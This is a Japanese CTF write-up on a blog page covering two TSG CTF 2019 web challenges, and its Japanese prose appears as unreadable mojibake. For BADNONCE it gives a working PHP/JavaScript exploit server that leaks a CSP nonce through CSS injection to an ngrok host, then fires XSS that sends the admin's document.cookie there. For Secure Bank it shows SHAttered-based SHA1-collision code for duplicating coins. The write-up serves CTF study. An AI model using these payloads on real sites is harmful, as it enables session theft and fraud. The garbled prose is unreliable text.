<!DOCTYPE html><html lang="ja"><head><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XKSQ648BQ2"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-XKSQ648BQ2')</script><meta charSet="utf-8"/><meta name="format-detection" content="telephone=no"/><meta name="viewport" content="initial-scale=1.0, width=device-width"/><meta name="author" content="sekai"/><meta name="generator" content="https://github.com/kaz/nextjs-blog-scaffold"/><meta property="og:url" content="https://6715.jp/posts/27/"/><meta property="og:site_name" content="6715.jp"/><link rel="icon" href="https://res.cloudinary.com/narusejun/image/twitter_name/h_128/sekai67.jpg"/><link rel="canonical" href="https://6715.jp/posts/27/"/><title>TSG CTF write-up (Web) | 6715.jp</title><meta name="description" content="TSG CTFã«ãƒãƒ¼ãƒ NaruseJunã§å‡ºã¾ã—ãŸã€‚4099ptsã‚’ç²å¾—ã—ã¦3ä½ã§ã—ãŸã€‚ TSG CTF ç§ã¯Webå•ã®ã¿ã‚’è§£ãã¾ã—ãŸã€‚ä»¥ä¸‹write-upã§ã™ã€‚ BADNONCE Part 1 (â€¦"/><meta name="twitter:card" content="summary"/><meta property="og:title" content="TSG CTF write-up (Web) | 6715.jp"/><meta property="og:type" content="article"/><meta property="og:image" content="https://res.cloudinary.com/narusejun/image/twitter_name/h_128/sekai67.jpg"/><meta property="og:description" content="TSG CTFã«ãƒãƒ¼ãƒ NaruseJunã§å‡ºã¾ã—ãŸã€‚4099ptsã‚’ç²å¾—ã—ã¦3ä½ã§ã—ãŸã€‚ TSG CTF ç§ã¯Webå•ã®ã¿ã‚’è§£ãã¾ã—ãŸã€‚ä»¥ä¸‹write-upã§ã™ã€‚ BADNONCE Part 1 (â€¦"/><meta property="article:published_time" content="2019-05-05T00:00:00.000Z"/><meta property="article:author" content="sekai"/><meta property="article:tag" content="CTF"/><meta property="article:tag" content="å‚åŠ è¨˜"/><meta name="next-head-count" content="20"/><link rel="preload" href="/_next/static/css/61bb26da18d2752efee9.css" as="style"/><link rel="stylesheet" href="/_next/static/css/61bb26da18d2752efee9.css" data-n-g=""/><link rel="preload" href="/_next/static/css/ad30b8ddc18c06e71d13.css" as="style"/><link rel="stylesheet" href="/_next/static/css/ad30b8ddc18c06e71d13.css" data-n-p=""/><noscript data-n-css=""></noscript></head><body><div id="__next"><header class="Header_header__1mCED"><h1><a href="/">6715.jp</a></h1></header><main class="posts_post__IJEgW"><section class="posts_meta__26MyQ"><small>2019-05-05</small><h1>TSG CTF write-up (Web)</h1><div><div><img src="https://res.cloudinary.com/narusejun/image/twitter_name/h_128/sekai67.jpg" alt="sekai"/><a href="#profile">sekai</a></div><div><svg aria-hidden="true" role="img" class="octicon" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display:inline-block;user-select:none;vertical-align:text-bottom"><path fill-rule="evenodd" d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z"></path></svg><a href="/tags/CTF/">CTF</a><a href="/tags/%E5%8F%82%E5%8A%A0%E8%A8%98/">å‚åŠ è¨˜</a></div></div></section><div class="SocialShare_social__3xEln"><a rel="noopener noreferrer" target="_blank" href="https://social-plugins.line.me/lineit/share?url=https%3A%2F%2F6715.jp%2Fposts%2F27%2F"><span title="LINE" style="background-color:#00C300"><svg viewBox="0 0 24 24"><path fill="white" d="M19.365 9.863c.349 0 .63.285.63.631 0 .345-.281.63-.63.63H17.61v1.125h1.755c.349 0 .63.283.63.63 0 .344-.281.629-.63.629h-2.386c-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346 0 .627.285.627.63 0 .349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211 0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346 0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195 0 .375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345 0 .63.285.63.63v4.771zm-5.741 0c0 .344-.282.629-.631.629-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346 0 .628.285.628.63v4.771zm-2.466.629H4.917c-.345 0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348 0 .63.285.63.63v4.141h1.756c.348 0 .629.283.629.63 0 .344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943 0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"></path></svg></span></a><a rel="noopener noreferrer" target="_blank" href="http://twitter.com/share?url=https%3A%2F%2F6715.jp%2Fposts%2F27%2F&amp;text=TSG%20CTF%20write-up%20(Web)%20%7C%206715.jp"><span title="Twitter" style="background-color:#1DA1F2"><svg viewBox="0 0 24 24"><path fill="white" d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"></path></svg></span></a><a rel="noopener noreferrer" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2F6715.jp%2Fposts%2F27%2F"><span title="Facebook" style="background-color:#1877F2"><svg viewBox="0 0 24 24"><path fill="white" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"></path></svg></span></a><a rel="noopener noreferrer" target="_blank" href="http://b.hatena.ne.jp/add?url=https%3A%2F%2F6715.jp%2Fposts%2F27%2F"><span title="Hatena Bookmark" style="background-color:#00A4DE"><svg viewBox="0 0 24 24"><path fill="white" d="M20.47 0C22.42 0 24 1.58 24 3.53v16.94c0 1.95-1.58 3.53-3.53 3.53H3.53C1.58 24 0 22.42 0 20.47V3.53C0 1.58 1.58 0 3.53 0h16.94zm-3.705 14.47c-.78 0-1.41.63-1.41 1.41s.63 1.414 1.41 1.414 1.41-.645 1.41-1.425-.63-1.41-1.41-1.41zM8.61 17.247c1.2 0 2.056-.042 2.58-.12.526-.084.976-.222 1.32-.412.45-.232.78-.564 1.02-.99s.36-.915.36-1.48c0-.78-.21-1.403-.63-1.87-.42-.48-.99-.734-1.74-.794.66-.18 1.156-.45 1.456-.81.315-.344.465-.824.465-1.424 0-.48-.103-.885-.3-1.26-.21-.36-.493-.645-.883-.87-.345-.195-.735-.315-1.215-.405-.464-.074-1.29-.12-2.474-.12H5.654v10.486H8.61zm.736-4.185c.705 0 1.185.088 1.44.262.27.18.39.495.39.93 0 .405-.135.69-.42.855-.27.18-.765.254-1.44.254H8.31v-2.297h1.05zm8.656.706v-7.06h-2.46v7.06H18zM8.925 9.08c.71 0 1.185.08 1.432.24.245.16.367.435.367.83 0 .38-.13.646-.39.804-.265.154-.747.232-1.452.232h-.57V9.08h.615z"></path></svg></span></a></div><article class="posts_content__YuXhG"><p><a href=https://ctftime.org/event/758 rel="noopener noreferrer"target=_blank>TSG CTF</a>ã«ãƒãƒ¼ãƒ NaruseJunã§å‡ºã¾ã—ãŸã€‚4099ptsã‚’ç²å¾—ã—ã¦3ä½ã§ã—ãŸã€‚<aside><a href=https://ctftime.org/event/758/ rel="noopener noreferrer"target=_blank style=background-image:url(https://ctftime.org/static/images/ct/logo.svg)><div><strong>TSG CTF</strong><cite>ctftime.org</cite><q cite=https://ctftime.org/event/758/>TSG is the official computer society of The University of Tokyo, and also the name of the CTF team organized by its m...</q></div></a></aside><p>ç§ã¯Webå•ã®ã¿ã‚’è§£ãã¾ã—ãŸã€‚ä»¥ä¸‹write-upã§ã™ã€‚<h1>BADNONCE Part 1 (247pts)</h1><p>CSPãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹ãƒšãƒ¼ã‚¸ã§XSSã—ã¦Cookieã‚’ç›—ã£ã¦ãã ã•ã„ã€ã¨ã„ã†å•é¡Œã§ã—ãŸã€‚<pre><code class="hljs language-html"><span class=hljs-tag>&lt;<span class=hljs-name>meta</span> <span class=hljs-attr>http-equiv</span>=<span class=hljs-string>"Content-Security-Policy"</span> <span class=hljs-attr>content</span>=<span class=hljs-string>"script-src 'nonce-&#60?= $nonce ?>';"</span>></span>
</code></pre><p>å•é¡ŒåãŒ <strong>BADNONCE</strong> ãªã®ã§æ˜ã‚‰ã‹ã«nonceã®å®Ÿè£…ãŒæ‚ªãã†ã§ã™ã€‚ å®Ÿéš›ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ã‚»ãƒƒã‚·ãƒ§ãƒ³IDã«å¯¾ã—ã¦nonceãŒå›ºå®šãªã®ã§ã€ã“ã‚ŒãŒæ¼ã‚Œã‚‹ã¨XSSãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚<pre><code class="hljs language-php">session_start();
<span class=hljs-variable>$nonce</span> = md5(session_id());
</code></pre><p>ä»¶ã®nonceã¯ã€ãƒšãƒ¼ã‚¸å†…ã®è¦ç´ ã®å±æ€§ã¨ã—ã¦å­˜åœ¨ã—ã¦ã„ã¾ã™ã€‚<pre><code class="hljs language-html"><span class=hljs-tag>&lt;<span class=hljs-name>script</span> <span class=hljs-attr>nonce</span>=&#60?= <span class=hljs-string>$nonce</span> ?></span><span class=javascript>>
				<span class=hljs-built_in>console</span>.log(<span class=hljs-string>'Welcome to the dungeon :-)'</span>);
</span><span class=hljs-tag>&#60/<span class=hljs-name>script</span>></span>
</code></pre><p>ã¨ã“ã‚ã§ã€ã“ã®ãƒšãƒ¼ã‚¸ã§ã¯<code>script-src</code>ã®ã¿åˆ¶é™ã•ã‚Œã¦ã„ã‚‹ã®ã§ã€ãŸã¨ãˆã°ã‚¹ã‚¿ã‚¤ãƒ«ã‚·ãƒ¼ãƒˆãªã©ã¯å¤–éƒ¨ã‚½ãƒ¼ã‚¹ã‹ã‚‰èª­ã¿è¾¼ã¿æ”¾é¡Œã§ã™ã€‚ ã—ãŸãŒã£ã¦ã€CSS InjectionãŒå¯èƒ½ã§ã™ã€‚ã‚»ãƒ¬ã‚¯ã‚¿ã‚’å·¥å¤«ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ã€è¦ç´ ã®å±æ€§å€¤ã‚’ç‰¹å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã­ã€‚<aside><a href=https://diary.shift-js.info/css-injection/ rel="noopener noreferrer"target=_blank style=background-image:url(https://b.st-hatena.com/images/v4/public/entry-button/button-only@2x.png)><div><strong>CSS Injection å†å…¥é–€</strong><cite>diary.shift-js.info</cite><q cite=https://diary.shift-js.info/css-injection/>æœ¬ç¨¿ã¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚­ãƒ£ãƒ³ãƒ— ä¿®äº†ç”Ÿé€²æ— #seccamp OB/OG Advent Calendar 2018 ã® 17 æ—¥ç›®ã¨ã—ã¦æ›¸ã‹ã‚ŒãŸè¨˜äº‹ã§ã™ã€‚ä¸€æ™‚æœŸã‚ˆãè©±é¡Œã«ä¸ŠãŒã£ã¦ã„ãŸ CSS Injection ã‚’, æ”¹ã‚ã¦çœºã‚ç›´ã—ã¦ã¿ãŸã„ã¨æ€ã„ã¾ã™ã€‚</q></div></a></aside><p>ãŸã ã—ã€ç®¡ç†è€…ã®ãƒ–ãƒ©ã‚¦ã‚¶ã‚’æ¨¡ã—ãŸã‚¯ãƒ­ãƒ¼ãƒ©ã¯ã€æ¯å›ç•°ãªã‚‹PHPSESSIDã‚’æŒã¤ãŸã‚ã€1åº¦ã®èµ·å‹•ã§æœ€å¾Œã¾ã§nonceã‚’æŠœãã¨ã£ã¦ã€XSSã‚’è¸ã¾ã›ã‚‹ã¨ã“ã‚ã¾ã§ã‚„ã‚‰ãªã„ã¨ã„ã‘ã¾ã›ã‚“ã€‚ ã¡ã‚‡ã£ã¨é¢å€’ã§ã™ãŒã€ç®¡ç†è€…ã«æ”»æ’ƒè»ŠãŒç”¨æ„ã—ãŸURLã‚’IFRAMEã§é–‹ãç¶šã‘ã‚‹ãƒšãƒ¼ã‚¸ã‚’è¸ã¾ã›ã¦ã€Injectã™ã‚‹CSSã‚’å¤‰ãˆãªãŒã‚‰ã€æœ€çµ‚çš„ã«XSSã‚’ç™ºç«ã•ã›ã‚‹ã‚ˆã†ã«ã—ã¾ã—ãŸã€‚ ä»¥ä¸‹ã®ã‚ˆã†ãªå®Ÿè£…ã«ãªã‚Šã¾ã—ãŸã€‚Webå•ã®Exploitã«ã—ã¦ã¯ã¡ã‚‡ã£ã¨é‡ã‚ã‹ã‚‚ã€‚ã‚‚ã£ã¨é ­ã®ã„ã„æ–¹æ³•ãŒå­˜åœ¨ã™ã‚‹å¯èƒ½æ€§ã‚‚ã‚ã‚Šã€‚<pre><code class="hljs language-php"><span class=hljs-meta>&#60?php</span>
	<span class=hljs-keyword>if</span> (array_key_exists(<span class=hljs-string>"save"</span>, <span class=hljs-variable>$_GET</span>)) {
		file_put_contents(<span class=hljs-string>"flag.txt"</span>, <span class=hljs-variable>$_GET</span>[<span class=hljs-string>"save"</span>] . PHP_EOL, LOCK_EX | FILE_APPEND);
	}
	<span class=hljs-keyword>else</span> <span class=hljs-keyword>if</span> (array_key_exists(<span class=hljs-string>"nonce"</span>, <span class=hljs-variable>$_GET</span>)) {
		<span class=hljs-variable>$nonce</span> = file_get_contents(<span class=hljs-string>"nonce.txt"</span>);
		<span class=hljs-keyword>if</span> (strlen(<span class=hljs-variable>$nonce</span>) &#60 strlen(<span class=hljs-variable>$_GET</span>[<span class=hljs-string>"nonce"</span>])) {
			file_put_contents(<span class=hljs-string>"nonce.txt"</span>, <span class=hljs-variable>$_GET</span>[<span class=hljs-string>"nonce"</span>], LOCK_EX);
		}
	}
	<span class=hljs-keyword>else</span> <span class=hljs-keyword>if</span> (array_key_exists(<span class=hljs-string>"css"</span>, <span class=hljs-variable>$_GET</span>)) {
		header(<span class=hljs-string>"Content-Type: text/css"</span>);
		<span class=hljs-keyword>echo</span>(<span class=hljs-string>"script { display: block }"</span> . PHP_EOL);

		<span class=hljs-variable>$nonce</span> = file_get_contents(<span class=hljs-string>"nonce.txt"</span>);
		<span class=hljs-variable>$chars</span> = str_split(<span class=hljs-string>"0123456789abcdef"</span>);

		<span class=hljs-keyword>foreach</span> (<span class=hljs-variable>$chars</span> <span class=hljs-keyword>as</span> <span class=hljs-variable>$c1</span>) {
			<span class=hljs-keyword>foreach</span> (<span class=hljs-variable>$chars</span> <span class=hljs-keyword>as</span> <span class=hljs-variable>$c2</span>) {
				<span class=hljs-variable>$x</span> = <span class=hljs-variable>$nonce</span> . <span class=hljs-variable>$c1</span> . <span class=hljs-variable>$c2</span>;
				<span class=hljs-keyword>echo</span>(<span class=hljs-string>"[nonce^='"</span> . <span class=hljs-variable>$x</span> . <span class=hljs-string>"'] { background: url(http://cf07fd07.ap.ngrok.io/?nonce="</span> . <span class=hljs-variable>$x</span> . <span class=hljs-string>") }"</span> . PHP_EOL);
			}
		}
	}
	<span class=hljs-keyword>else</span> <span class=hljs-keyword>if</span> (array_key_exists(<span class=hljs-string>"go"</span>, <span class=hljs-variable>$_GET</span>)) {
		<span class=hljs-variable>$nonce</span> = file_get_contents(<span class=hljs-string>"nonce.txt"</span>);
		<span class=hljs-keyword>if</span> (strlen(<span class=hljs-variable>$nonce</span>) &#60 <span class=hljs-number>32</span>) {
			header(<span class=hljs-string>"Location: http://35.187.214.138:10023/?q=%3Clink%20rel%3D%22stylesheet%22%20href%3D%22http%3A%2F%2Fcf07fd07.ap.ngrok.io%2F%3Fcss%3D"</span> . microtime(<span class=hljs-literal>true</span>) . <span class=hljs-string>"%22%3E"</span>);
		}
		<span class=hljs-keyword>else</span> {
			header(<span class=hljs-string>"Location: http://35.187.214.138:10023/?q=%3Cscript%20nonce%3D%22"</span> . <span class=hljs-variable>$nonce</span> . <span class=hljs-string>"%22%3Efetch(%22http%3A%2F%2Fcf07fd07.ap.ngrok.io%2F%3Fsave%3D%22%20%2B%20encodeURIComponent(document.cookie))%3C%2Fscript%3E"</span>);
		}
	}
	<span class=hljs-keyword>else</span> <span class=hljs-keyword>if</span> (array_key_exists(<span class=hljs-string>"start"</span>, <span class=hljs-variable>$_GET</span>)) {
		file_put_contents(<span class=hljs-string>"nonce.txt"</span>, <span class=hljs-string>""</span>, LOCK_EX);
		file_put_contents(<span class=hljs-string>"flag.txt"</span>, <span class=hljs-string>""</span>, LOCK_EX);
<span class=hljs-meta>?></span>
&#60html>
&#60body>
&#60script>
	setInterval(() => {
		<span class=hljs-keyword>const</span> iframe = document.createElement(<span class=hljs-string>"iframe"</span>);
		iframe.src = `?go=${(<span class=hljs-keyword>new</span> Date).getTime()}`;
		document.body.appendChild(iframe);
	}, <span class=hljs-number>256</span>);
&#60/script>
&#60/body>
&#60/html>
<span class=hljs-meta>&#60?php</span>
	}
	<span class=hljs-keyword>else</span> {
		<span class=hljs-keyword>echo</span>(<span class=hljs-string>"E R R O R !"</span>);
	}
<span class=hljs-meta>?></span>
</code></pre><h1>Secure Bank (497pts)</h1><p>rubyã§æ›¸ã‹ã‚ŒãŸã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã€ã‚³ã‚¤ãƒ³ã®é€å—ä¿¡ãŒã§ãã¾ã™ã€‚ ãŸãã•ã‚“ã®ã‚³ã‚¤ãƒ³ã‚’é›†ã‚ã‚Œã°ã€FLAGãŒå…¥æ‰‹ã§ãã‚‹ã‚ˆã†ã§ã™ã€‚<pre><code class="hljs language-ruby">  get <span class=hljs-string>'/api/flag'</span> <span class=hljs-keyword>do</span>
    <span class=hljs-keyword>return</span> err(<span class=hljs-number>401</span>, <span class=hljs-string>'login first'</span>) <span class=hljs-keyword>unless</span> user = session[<span class=hljs-symbol>:user</span>]

    hashed_user = STRETCH.times.inject(user){<span class=hljs-params>|s|</span> Digest::SHA1.hexdigest(s)}

    res = DB.query <span class=hljs-string>'SELECT balance FROM account WHERE user = ?'</span>, hashed_user
    row = res.<span class=hljs-keyword>next</span>
    balance = row &#38&#38 row[<span class=hljs-number>0</span>]
    res.close

    <span class=hljs-keyword>return</span> err(<span class=hljs-number>401</span>, <span class=hljs-string>'login first'</span>) <span class=hljs-keyword>unless</span> balance
    <span class=hljs-keyword>return</span> err(<span class=hljs-number>403</span>, <span class=hljs-string>'earn more coins!!!'</span>) <span class=hljs-keyword>unless</span> balance >= <span class=hljs-number>10_000_000_000</span>

    json({<span class=hljs-symbol>flag:</span> IO.binread(<span class=hljs-string>'data/flag.txt'</span>)})
  <span class=hljs-keyword>end</span>
</code></pre><p>æ€ªã—ã„ã®ã¯é€é‡‘ã‚³ãƒ¼ãƒ‰ã§ã€ã“ã†ã„ã†å½¢ã€‚<pre><code class="hljs language-ruby">  post <span class=hljs-string>'/api/transfer'</span> <span class=hljs-keyword>do</span>
    <span class=hljs-keyword>return</span> err(<span class=hljs-number>401</span>, <span class=hljs-string>'login first'</span>) <span class=hljs-keyword>unless</span> src = session[<span class=hljs-symbol>:user</span>]

    <span class=hljs-keyword>return</span> err(<span class=hljs-number>400</span>, <span class=hljs-string>'bad request'</span>) <span class=hljs-keyword>unless</span> dst = params[<span class=hljs-symbol>:target</span>] <span class=hljs-keyword>and</span> String === dst <span class=hljs-keyword>and</span> dst != src
    <span class=hljs-keyword>return</span> err(<span class=hljs-number>400</span>, <span class=hljs-string>'bad request'</span>) <span class=hljs-keyword>unless</span> amount = params[<span class=hljs-symbol>:amount</span>] <span class=hljs-keyword>and</span> String === amount
    <span class=hljs-keyword>return</span> err(<span class=hljs-number>400</span>, <span class=hljs-string>'bad request'</span>) <span class=hljs-keyword>unless</span> amount = amount.to_i <span class=hljs-keyword>and</span> amount > <span class=hljs-number>0</span>

    sleep <span class=hljs-number>1</span>

    hashed_src = STRETCH.times.inject(src){<span class=hljs-params>|s|</span> Digest::SHA1.hexdigest(s)}
    hashed_dst = STRETCH.times.inject(dst){<span class=hljs-params>|s|</span> Digest::SHA1.hexdigest(s)}

    res = DB.query <span class=hljs-string>'SELECT balance FROM account WHERE user = ?'</span>, hashed_src
    row = res.<span class=hljs-keyword>next</span>
    balance_src = row &#38&#38 row[<span class=hljs-number>0</span>]
    res.close
    <span class=hljs-keyword>return</span> err(<span class=hljs-number>422</span>, <span class=hljs-string>'no enough coins'</span>) <span class=hljs-keyword>unless</span> balance_src >= amount

    res = DB.query <span class=hljs-string>'SELECT balance FROM account WHERE user = ?'</span>, hashed_dst
    row = res.<span class=hljs-keyword>next</span>
    balance_dst = row &#38&#38 row[<span class=hljs-number>0</span>]
    res.close
    <span class=hljs-keyword>return</span> err(<span class=hljs-number>422</span>, <span class=hljs-string>'no such user'</span>) <span class=hljs-keyword>unless</span> balance_dst

    balance_src -= amount
    balance_dst += amount

    DB.execute <span class=hljs-string>'UPDATE account SET balance = ?  WHERE user = ?'</span>, balance_src, hashed_src
    DB.execute <span class=hljs-string>'UPDATE account SET balance = ?  WHERE user = ?'</span>, balance_dst, hashed_dst

    json({<span class=hljs-symbol>amount:</span> amount, <span class=hljs-symbol>balance:</span> balance_src})
  <span class=hljs-keyword>end</span>
</code></pre><p>ã±ã£ã¨è¦‹ãŸã¨ã“ã‚ã€ãƒˆãƒ©ãƒ³ã‚¶ã‚¯ã‚·ãƒ§ãƒ³ã‚’è€ƒæ…®ã—ã¦ã„ãªã„ã®ã§ã€é«˜é »åº¦ã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é£›ã°ã›ã°Race Conditionã§äºŒé‡é€é‡‘ãŒã§ããã†ã ã£ãŸã‚“ã§ã™ãŒã€è»½ãè©¦ã—ãŸã¨ã“ã‚ã€ã‚¿ã‚¤ãƒŸãƒ³ã‚°ãŒã‚·ãƒ“ã‚¢ã§ã»ã¨ã‚“ã©ã†ã¾ãã„ã‹ãªã‹ã£ãŸã®ã§ã€ã“ã®æ–¹é‡ã¯è«¦ã‚ã¾ã—ãŸã€‚<p>ã¨ã“ã‚ã§ã€ã“ã®ã‚³ãƒ¼ãƒ‰ã‚’ã‚‚ã†å°‘ã—ã‚ˆãè¦‹ã‚‹ã¨ã€å®›å…ˆã¨é€é‡‘å…ƒãŒåŒä¸€ã®ãƒ¦ãƒ¼ã‚¶ã§ã‚ã£ãŸã¨ãã€ã‚³ã‚¤ãƒ³ãŒå¢—æ®–ã™ã‚‹ã“ã¨ã¯æ˜ã‚‰ã‹ã§ã™ã€‚ ã‚‚ã¡ã‚ã‚“ã€è‡ªåˆ†è‡ªèº«ã¸ã®é€é‡‘ã¯ã‚¨ãƒ©ãƒ¼ã«ãªã‚‹å®Ÿè£…ã¨ãªã£ã¦ã„ã‚‹ã‚“ã§ã™ãŒã€æ®‹é«˜ã®ç…§ä¼šã‚’ãƒ¦ãƒ¼ã‚¶åã‚’ãƒãƒƒã‚·ãƒ¥ã—ãŸå€¤ã§è¡Œã£ã¦ã„ã‚‹ã®ã«å¯¾ã—ã¦ã€ãƒ¦ãƒ¼ã‚¶ã®åŒä¸€æ€§åˆ¤å®šã¯å…ƒã®æ–‡å­—åˆ—ã§è¡Œã£ã¦ã„ã¾ã™ã€‚ ã¤ã¾ã‚Šã¯ã€åˆ¥ã®æ–‡å­—åˆ—ã§ã‚ã£ã¦ã€SHA1ãƒãƒƒã‚·ãƒ¥ã®çµæœãŒåŒä¸€ã«ãªã‚‹æ–‡å­—åˆ—ã®çµ„ãŒã‚‚ã—å­˜åœ¨ã™ã‚Œã°ã€ç„¡é™ã«ã‚³ã‚¤ãƒ³ã‚’å¢—ã‚„ã™ã“ã¨ãŒã§ããã†ã§ã™ã€‚<p>SHA1ã®è¡çªã¨ã„ãˆã°â€¦â€¦<a href=https://shattered.io/ rel="noopener noreferrer"target=_blank>SHAttered</a>ã§ã™ã‚ˆã­ã€‚ è©³ã—ã„ç†å±ˆã¯ã‚°ã‚°ã£ã¦ã‚‚ã‚‰ã†ã¨ã—ã¦ã€ã“ã‚Œã‚’ç”¨ã„ã‚Œã°ã€å…ˆã«è¿°ã¹ãŸè¦ä»¶ã‚’æº€ãŸã™ã‚ˆã†ãªæ–‡å­—åˆ—ï¼ˆã¨ã„ã†ã‹ãƒã‚¤ãƒˆåˆ—ï¼‰ã®çµ„ãŒç”¨æ„ã§ãã¾ã™ã€‚<p>JSONã¨ã—ã¦non-printableãªæ–‡å­—ã‚’é€ã‚‹éš›ã«ç ´å£Šã•ã‚Œãªã„ã‚ˆã†ã«æ³¨æ„ã—ã¤ã¤ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ã—ã¦ç”¨æ„ã—ã¾ã—ãŸã€‚<pre><code class="hljs language-php"><span class=hljs-meta>&#60?php</span>
	<span class=hljs-variable>$s1</span> = file_get_contents(<span class=hljs-string>"shattered-1.pdf"</span>);
	<span class=hljs-variable>$s2</span> = file_get_contents(<span class=hljs-string>"shattered-2.pdf"</span>);

	<span class=hljs-variable>$t1</span> = substr(<span class=hljs-variable>$s1</span>, <span class=hljs-number>0</span>, <span class=hljs-number>320</span>) . <span class=hljs-string>"narusejun"</span>;
	<span class=hljs-variable>$t2</span> = substr(<span class=hljs-variable>$s2</span>, <span class=hljs-number>0</span>, <span class=hljs-number>320</span>) . <span class=hljs-string>"narusejun"</span>;

	<span class=hljs-keyword>echo</span>(sha1(<span class=hljs-variable>$t1</span>) . PHP_EOL);
	<span class=hljs-keyword>echo</span>(sha1(<span class=hljs-variable>$t2</span>) . PHP_EOL);

	<span class=hljs-function><span class=hljs-keyword>function</span> <span class=hljs-title>toStr</span>(<span class=hljs-params><span class=hljs-variable>$c</span></span>) </span>{
		<span class=hljs-variable>$i</span> = ord(<span class=hljs-variable>$c</span>);
		<span class=hljs-keyword>if</span> (<span class=hljs-variable>$c</span> == <span class=hljs-string>'"'</span>) {
			<span class=hljs-keyword>return</span> <span class=hljs-string>'\\"'</span>;
		}
		<span class=hljs-keyword>if</span> (<span class=hljs-variable>$c</span> == <span class=hljs-string>'%'</span>) {
			<span class=hljs-keyword>return</span> <span class=hljs-string>'%%'</span>;
		}
		<span class=hljs-keyword>if</span> (<span class=hljs-variable>$i</span> &#60 <span class=hljs-number>0x20</span>) {
			<span class=hljs-keyword>return</span> sprintf(<span class=hljs-string>"\\u%04x"</span>, <span class=hljs-variable>$i</span>);
		}
		<span class=hljs-keyword>if</span> (<span class=hljs-variable>$i</span> &#60 <span class=hljs-number>0x7F</span>) {
			<span class=hljs-keyword>return</span> <span class=hljs-variable>$c</span>;
		}
		<span class=hljs-keyword>return</span> sprintf(<span class=hljs-string>"\\x%02x"</span>, ord(<span class=hljs-variable>$c</span>));
	}
	<span class=hljs-variable>$u1</span> = implode(array_map(toStr, str_split(<span class=hljs-variable>$t1</span>)));
	<span class=hljs-variable>$u2</span> = implode(array_map(toStr, str_split(<span class=hljs-variable>$t2</span>)));

	<span class=hljs-keyword>echo</span>(<span class=hljs-variable>$u1</span> . PHP_EOL);
	<span class=hljs-keyword>echo</span>(<span class=hljs-variable>$u2</span> . PHP_EOL);
<span class=hljs-meta>?></span>
